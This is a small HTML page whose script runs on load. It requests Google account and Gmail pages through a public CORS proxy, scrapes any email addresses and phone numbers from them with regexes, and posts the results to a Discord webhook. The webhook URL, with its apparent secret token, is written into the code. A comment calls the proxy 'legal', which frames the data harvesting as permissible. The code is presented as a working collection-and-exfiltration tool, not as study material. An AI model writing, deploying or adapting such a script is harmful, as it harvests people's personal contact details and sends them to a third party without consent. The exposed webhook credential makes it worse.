<!DOCTYPE html>
<html>
<body>
<script>

const TARGETS = [
  "https://accounts.google.com/AccountChooser",
  "https://mail.google.com/mail"
];

// Legal public CORS proxy
const PROXY = "https://api.allorigins.win/raw?url=";

const WEBHOOK = "https://discord.com/api/webhooks/1469344031371694254/D8F6QXpH0fs7CIPp7D9mjB35AtRi3kj2saow0qPm11A4KCa1LLDxT698Hgnc5DUv0LXJ";

const results = { emails: new Set(), phones: new Set() };

const patterns = {
  emails: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}/gi,
  phones: /\+?\d[\d\s\-().]{7,}/g
};

async function scan(url) {
  try {
    const res = await fetch(PROXY + encodeURIComponent(url));
    const text = await res.text();

    for (const key in patterns) {
      (text.match(patterns[key]) || []).forEach(v => results[key].add(v));
    }

  } catch {}
}

(async () => {
  await Promise.all(TARGETS.map(scan));

  const output = {
    emails: [...results.emails],
    phones: [...results.phones]
  };

  // Send to Discord
  if (WEBHOOK) {
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "Scan Results:\n```json\n" + JSON.stringify(output, null, 2) + "\n```"
      })
    });
  }
})();
</script>
</body>
</html>
